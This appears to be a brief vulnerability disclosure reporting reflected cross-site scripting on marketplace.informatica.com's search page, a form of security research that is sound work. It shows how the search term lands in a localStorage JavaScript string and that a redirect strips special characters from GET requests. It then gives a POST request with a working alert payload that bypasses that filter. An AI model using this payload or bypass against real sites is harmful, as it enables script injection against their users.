Summary:

The search query parameter is put into Javascript to set the localStorage item:

https://marketplace.informatica.com/search-solr.jspa?q=%foo%

```javascript
localStorage.setItem("searchTerm", "%foo%");
```

Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:

```http
GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
Host: marketplace.informatica.com

HTTP/1.0 302 Found
Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
```

However it turns out the search param can be successfully submitted via POST â€” the following request popups an alert:

```http
POST /search-solr.jspa HTTP/1.1
Host: marketplace.informatica.com

q=%22-alert%28document.domain%29-%22
```
